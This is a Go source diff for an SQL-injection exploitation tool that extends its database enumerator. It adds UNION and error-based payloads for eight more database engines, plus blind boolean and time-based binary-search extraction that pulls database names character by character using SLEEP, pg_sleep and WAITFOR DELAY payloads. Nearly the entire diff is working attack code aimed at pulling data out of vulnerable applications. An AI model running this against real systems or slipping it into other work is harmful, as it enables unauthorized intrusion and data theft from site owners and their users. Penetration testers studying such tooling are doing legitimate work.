@@ -4,6 +4,7 @@ import (
 	"fmt"
 	"regexp"
 	"strings"
+	"time"
 )
 
 type Enumerator struct {
@@ -181,29 +182,50 @@ func (en *Enumerator) ListDatabases(vulnParam string, dbms string) ([]string, er
 
 	// Phase 1: Try GROUP_CONCAT/aggregate (fastest — single request)
 	dbs := en.tryAggregateDatabases(vulnParam, dbms)
-	databases = append(databases, dbs...)
+	for _, db := range dbs {
+		if !contains(databases, db) && db != "" {
+			databases = append(databases, db)
+		}
+	}
 
 	// Phase 2: Row-by-row with multiple strategies
-	dbs = en.tryRowByRowDatabases(vulnParam, dbms)
-	for _, db := range dbs {
-		if !contains(databases, db) {
-			databases = append(databases, db)
+	if len(databases) < 5 {
+		dbs = en.tryRowByRowDatabases(vulnParam, dbms)
+		for _, db := range dbs {
+			if !contains(databases, db) && db != "" {
+				databases = append(databases, db)
+			}
 		}
 	}
 
 	// Phase 3: Current database info
 	dbs = en.tryCurrentDB(vulnParam, dbms)
 	for _, db := range dbs {
-		if !contains(databases, db) {
+		if !contains(databases, db) && db != "" {
 			databases = append(databases, db)
 		}
 	}
 
-	// Phase 4: Fallback — common names if nothing found
+	// Phase 4: Blind binary-search extraction (for boolean/time-based blind)
+	if len(databases) < 3 {
+		en.Engine.GetLogger().Info("trying blind binary-search enumeration of database names...")
+		dbs = en.tryBlindDatabases(vulnParam, dbms)
+		for _, db := range dbs {
+			if !contains(databases, db) && db != "" {
+				databases = append(databases, db)
+			}
+		}
+	}
+
+	// Phase 5: Fallback — common names if nothing found
 	if len(databases) == 0 {
 		en.Engine.GetLogger().Warning("No databases found through injection, trying common names...")
 		common := en.tryCommonDBNames(vulnParam, dbms)
-		databases = append(databases, common...)
+		for _, db := range common {
+			if !contains(databases, db) && db != "" {
+				databases = append(databases, db)
+			}
+		}
 	}
 
 	if len(databases) == 0 {
@@ -258,6 +280,49 @@ func (en *Enumerator) tryAggregateDatabases(vulnParam string, dbms string) []str
 		payloads := unionVariants("'", "-- -",
 			"GROUP_CONCAT(DISTINCT name)",
 			"FROM pragma_database_list")
+		results = en.tryPayloads(payloads, vulnParam, strategies)
+	case "BigQuery":
+		payloads := unionVariants("'", "-- -",
+			"STRING_AGG(DISTINCT schema_name, ',')",
+			"FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA")
+		results = en.tryPayloads(payloads, vulnParam, strategies)
+	case "ClickHouse":
+		payloads := []string{
+			"' AND extractvalue(1,concat(0x7e,(SELECT groupArray(DISTINCT name) FROM system.databases),0x7e))-- -",
+		}
+		payloads = append(payloads, unionVariants("'", "-- -",
+			"groupArray(DISTINCT name)",
+			"FROM system.databases")...)
+		results = en.tryPayloads(payloads, vulnParam, strategies)
+	case "CockroachDB":
+		payloads := unionVariants("'", "-- -",
+			"string_agg(DISTINCT database_name, ',')",
+			"FROM crdb_internal.databases")
+		results = en.tryPayloads(payloads, vulnParam, strategies)
+	case "DuckDB":
+		payloads := unionVariants("'", "-- -",
+			"STRING_AGG(DISTINCT database_name, ',')",
+			"FROM information_schema.schemata")
+		results = en.tryPayloads(payloads, vulnParam, strategies)
+	case "Firebird":
+		payloads := unionVariants("'", "-- -",
+			"LIST(DISTINCT mon$database_name, ',')",
+			"FROM mon$database")
+		results = en.tryPayloads(payloads, vulnParam, strategies)
+	case "H2":
+		payloads := unionVariants("'", "-- -",
+			"STRING_AGG(DISTINCT catalog, ',')",
+			"FROM information_schema.catalogs")
+		results = en.tryPayloads(payloads, vulnParam, strategies)
+	case "Snowflake":
+		payloads := unionVariants("'", "-- -",
+			"LISTAGG(DISTINCT database_name, ',')",
+			"FROM information_schema.databases")
+		results = en.tryPayloads(payloads, vulnParam, strategies)
+	case "Sybase":
+		payloads := unionVariants("'", "-- -",
+			"LIST(DISTINCT name, ',')",
+			"FROM sysdatabases")
 		results = en.tryPayloads(payloads, vulnParam, strategies)
 	}
 
@@ -443,6 +508,121 @@ func (en *Enumerator) tryRowByRowDatabases(vulnParam string, dbms string) []stri
 				break
 			}
 		}
+	case "BigQuery":
+		for i := 0; i < maxRows; i++ {
+			payloads := unionVariants("'", "-- -",
+				"schema_name",
+				fmt.Sprintf("FROM `region-us`.INFORMATION_SCHEMA.SCHEMATA LIMIT 1 OFFSET %d", i))
+			for _, p := range payloads {
+				body, _, _, err := en.Engine.Request(p, vulnParam)
+				if err != nil { continue }
+				extracted := en.extractData(body, strategies)
+				for _, e := range extracted {
+					if e != "" && !contains(databases, e) {
+						databases = append(databases, e)
+					}
+				}
+			}
+		}
+	case "ClickHouse":
+		for i := 0; i < maxRows; i++ {
+			payloads := []string{
+				fmt.Sprintf("' AND extractvalue(1,concat(0x7e,(SELECT name FROM system.databases LIMIT 1 OFFSET %d),0x7e))-- -", i),
+			}
+			for _, p := range payloads {
+				body, _, _, err := en.Engine.Request(p, vulnParam)
+				if err != nil { continue }
+				extracted := en.extractData(body, strategies)
+				for _, e := range extracted {
+					if e != "" && !contains(databases, e) {
+						databases = append(databases, e)
+					}
+				}
+			}
+			if strings.Contains(dbms, "Unknown") || i > 30 {
+				break
+			}
+		}
+	case "CockroachDB":
+		for i := 0; i < maxRows; i++ {
+			payloads := unionVariants("'", "-- -",
+				"database_name",
+				fmt.Sprintf("FROM crdb_internal.databases LIMIT 1 OFFSET %d", i))
+			for _, p := range payloads {
+				body, _, _, err := en.Engine.Request(p, vulnParam)
+				if err != nil { continue }
+				extracted := en.extractData(body, strategies)
+				for _, e := range extracted {
+					if e != "" && !contains(databases, e) {
+						databases = append(databases, e)
+					}
+				}
+			}
+		}
+	case "DuckDB":
+		for i := 0; i < maxRows; i++ {
+			payloads := unionVariants("'", "-- -",
+				"database_name",
+				fmt.Sprintf("FROM information_schema.schemata LIMIT 1 OFFSET %d", i))
+			for _, p := range payloads {
+				body, _, _, err := en.Engine.Request(p, vulnParam)
+				if err != nil { continue }
+				extracted := en.extractData(body, strategies)
+				for _, e := range extracted {
+					if e != "" && !contains(databases, e) {
+						databases = append(databases, e)
+					}
+				}
+			}
+		}
+	case "Firebird", "Sybase":
+		for i := 0; i < maxRows; i++ {
+			payloads := unionVariants("'", "-- -",
+				"mon$database_name",
+				fmt.Sprintf("FROM mon$database ROWS %d TO %d", i+1, i+1))
+			for _, p := range payloads {
+				body, _, _, err := en.Engine.Request(p, vulnParam)
+				if err != nil { continue }
+				extracted := en.extractData(body, strategies)
+				for _, e := range extracted {
+					if e != "" && !contains(databases, e) {
+						databases = append(databases, e)
+					}
+				}
+			}
+		}
+	case "H2":
+		for i := 0; i < maxRows; i++ {
+			payloads := unionVariants("'", "-- -",
+				"catalog",
+				fmt.Sprintf("FROM information_schema.catalogs LIMIT 1 OFFSET %d", i))
+			for _, p := range payloads {
+				body, _, _, err := en.Engine.Request(p, vulnParam)
+				if err != nil { continue }
+				extracted := en.extractData(body, strategies)
+				for _, e := range extracted {
+					if e != "" && !contains(databases, e) {
+						databases = append(databases, e)
+					}
+				}
+			}
+		}
+	case "Snowflake":
+		for i := 0; i < maxRows; i++ {
+			payloads := unionVariants("'", "-- -",
+				"database_name",
+				fmt.Sprintf("FROM information_schema.databases LIMIT 1 OFFSET %d", i))
+			for _, p := range payloads {
+				body, _, _, err := en.Engine.Request(p, vulnParam)
+				if err != nil { continue }
+				extracted := en.extractData(body, strategies)
+				for _, e := range extracted {
+					if e != "" && !contains(databases, e) {
+						databases = append(databases, e)
+					}
+				}
+			}
+		}
 	}
 
 	return databases
@@ -481,6 +661,140 @@ func (en *Enumerator) tryCurrentDB(vulnParam string, dbms string) []string {
 	}
 
 	return en.tryPayloads(payloads, vulnParam, strategies)
+}
+
+func (en *Enumerator) tryBlindDatabases(vulnParam string, dbms string) []string {
+	var databases []string
+
+	oracleType := en.detectBlindOracleType(vulnParam)
+	if oracleType == "" {
+		return databases
+	}
+
+	maxDBs := 50
+	maxNameLen := 48
+
+	for dbIdx := 0; dbIdx < maxDBs; dbIdx++ {
+		var nameBuilder strings.Builder
+		found := false
+
+		for pos := 1; pos <= maxNameLen; pos++ {
+			ch := en.blindExtractChar(vulnParam, dbms, dbIdx, pos, oracleType)
+			if ch == 0 {
+				break
+			}
+			nameBuilder.WriteByte(ch)
+			found = true
+		}
+
+		if found && nameBuilder.Len() > 0 {
+			name := nameBuilder.String()
+			if !contains(databases, name) && isValidName(name) {
+				databases = append(databases, name)
+				en.Engine.GetLogger().Debug(fmt.Sprintf("blind-db[%d]: %s", dbIdx, name))
+			}
+		} else {
+			if dbIdx >= 2 {
+				break
+			}
+		}
+	}
+
+	return databases
+}
+
+func (en *Enumerator) detectBlindOracleType(vulnParam string) string {
+	truePayload := "' AND 1=1-- "
+	falsePayload := "' AND 1=2-- "
+
+	trueBody, trueLen, _, err := en.Engine.Request(truePayload, vulnParam)
+	if err != nil {
+		return ""
+	}
+	falseBody, falseLen, _, err := en.Engine.Request(falsePayload, vulnParam)
+	if err != nil {
+		return ""
+	}
+	_ = trueBody
+	_ = falseBody
+
+	if trueLen != falseLen && trueLen > 0 && falseLen > 0 {
+		return "boolean"
+	}
+
+	timePayload := "' AND SLEEP(3)-- "
+	start := time.Now()
+	en.Engine.Request(timePayload, vulnParam)
+	if time.Since(start) >= 2*time.Second {
+		return "time"
+	}
+
+	return ""
+}
+
+func (en *Enumerator) blindExtractChar(vulnParam, dbms string, dbIdx, pos int, oracleType string) byte {
+	low, high := 32, 126
+	for low <= high {
+		mid := (low + high) / 2
+		payload := en.buildBlindDBPayload(vulnParam, dbms, dbIdx, pos, mid, oracleType)
+		if payload == "" {
+			return 0
+		}
+		matched := en.testBlindCondition(payload, vulnParam, oracleType)
+		if matched {
+			low = mid + 1
+		} else {
+			high = mid - 1
+		}
+	}
+	if low >= 32 && low <= 126 {
+		return byte(low)
+	}
+	return 0
+}
+
+func (en *Enumerator) buildBlindDBPayload(vulnParam, dbms string, dbIdx, pos, mid int, oracleType string) string {
+	switch {
+	case strings.Contains(dbms, "MySQL") || strings.Contains(dbms, "MariaDB"):
+		if oracleType == "time" {
+			return fmt.Sprintf("' AND IF(ASCII(SUBSTR((SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET %d),%d,1))>%d,SLEEP(3),0)-- ", dbIdx, pos, mid)
+		}
+		return fmt.Sprintf("' AND ASCII(SUBSTR((SELECT schema_name FROM information_schema.schemata LIMIT 1 OFFSET %d),%d,1))>%d-- ", dbIdx, pos, mid)
+	case strings.Contains(dbms, "PostgreSQL") || strings.Contains(dbms, "CockroachDB"):
+		if oracleType == "time" {
+			return fmt.Sprintf("' AND (SELECT CASE WHEN ASCII(SUBSTR((SELECT datname FROM pg_database LIMIT 1 OFFSET %d),%d,1))>%d THEN pg_sleep(3) ELSE 0 END)-- ", dbIdx, pos, mid)
+		}
+		return fmt.Sprintf("' AND ASCII(SUBSTR((SELECT datname FROM pg_database LIMIT 1 OFFSET %d),%d,1))>%d-- ", dbIdx, pos, mid)
+	case strings.Contains(dbms, "MSSQL"):
+		if oracleType == "time" {
+			return fmt.Sprintf("' IF(ASCII(SUBSTRING((SELECT name FROM sys.databases ORDER BY name OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY),%d,1))>%d) WAITFOR DELAY '0:0:3'-- ", dbIdx, pos, mid)
+		}
+		return fmt.Sprintf("' AND ASCII(SUBSTRING((SELECT name FROM sys.databases ORDER BY name OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY),%d,1))>%d-- ", dbIdx, pos, mid)
+	case strings.Contains(dbms, "Oracle"):
+		return fmt.Sprintf("' AND ASCII(SUBSTR((SELECT owner FROM (SELECT owner, ROWNUM r FROM (SELECT DISTINCT owner FROM all_tables)) WHERE r=%d),%d,1))>%d-- ", dbIdx+1, pos, mid)
+	case strings.Contains(dbms, "SQLite"):
+		return fmt.Sprintf("' AND UNICODE(SUBSTR((SELECT name FROM pragma_database_list LIMIT 1 OFFSET %d),%d,1))>%d-- ", dbIdx, pos, mid)
+	default:
+		return ""
+	}
+}
+
+func (en *Enumerator) testBlindCondition(payload, vulnParam, oracleType string) bool {
+	switch oracleType {
+	case "boolean":
+		testBody, testLen, _, err := en.Engine.Request(payload, vulnParam)
+		if err != nil { return false }
+		_ = testBody
+		_, baseLen, _, err := en.Engine.Request("", "")
+		if err != nil { return false }
+		return testLen > baseLen+10
+	case "time":
+		start := time.Now()
+		en.Engine.Request(payload, vulnParam)
+		return time.Since(start) >= 2*time.Second
+	default:
+		return false
+	}
 }
 
 func (en *Enumerator) tryCommonDBNames(vulnParam string, dbms string) []string {
